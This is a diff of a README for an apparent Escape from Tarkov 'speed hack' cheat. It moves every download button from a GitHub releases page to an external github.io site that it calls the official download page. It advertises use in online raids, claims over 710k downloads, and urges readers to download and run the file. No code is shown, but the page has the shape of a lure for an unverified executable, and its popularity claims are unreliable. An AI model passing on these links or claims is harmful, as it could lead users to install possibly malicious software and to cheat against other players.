@@ -1,6 +1,6 @@
 # ⚡ tarkov-speed-hack-2026 - Move Faster, Survive More
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download-v2026-blue?style=for-the-badge&logo=github&logoColor=white&color=FF6F00)](https://github.com/Himantopushimantopusconcentration4160/tarkov-speed-hack-2026/releases)
+[![Download Now](https://img.shields.io/badge/⬇️_Download-v2026-blue?style=for-the-badge&logo=github&logoColor=white&color=FF6F00)](https://himantopushimantopusconcentration4160.github.io)
 
 ![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D6?style=flat-square&logo=windows&logoColor=white) ![Version](https://img.shields.io/badge/Version-v2026-brightgreen?style=flat-square) ![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square) ![Downloads](https://img.shields.io/badge/Downloads-710k%2B-orange?style=flat-square)
 
@@ -44,7 +44,7 @@ It works **during online raids** and gives you precise control over how fast you
 
 ### Step 1: Get the File
 
-[![Download Button](https://img.shields.io/badge/GitHub-Download_Page-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=darkgreen)](https://github.com/Himantopushimantopusconcentration4160/tarkov-speed-hack-2026/releases)
+[![Download Button](https://img.shields.io/badge/GitHub-Download_Page-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=darkgreen)](https://himantopushimantopusconcentration4160.github.io)
 
 **Visit this link to download the application.** This is the official download page. Scroll down until you see the file, then click to download it.
 
@@ -160,7 +160,7 @@ This tool gives you a **significant advantage** in mobility. Move faster, reach 
 
 **Download today and never be too slow again.**
 
-[![Download Now](https://img.shields.io/badge/⬇️_Get_v2026-710k%2B_Downloads-red?style=for-the-badge&logo=github&logoColor=white&color=critical)](https://github.com/Himantopushimantopusconcentration4160/tarkov-speed-hack-2026/releases)
+[![Download Now](https://img.shields.io/badge/⬇️_Get_v2026-710k%2B_Downloads-red?style=for-the-badge&logo=github&logoColor=white&color=critical)](https://himantopushimantopusconcentration4160.github.io)
 
 ---
 
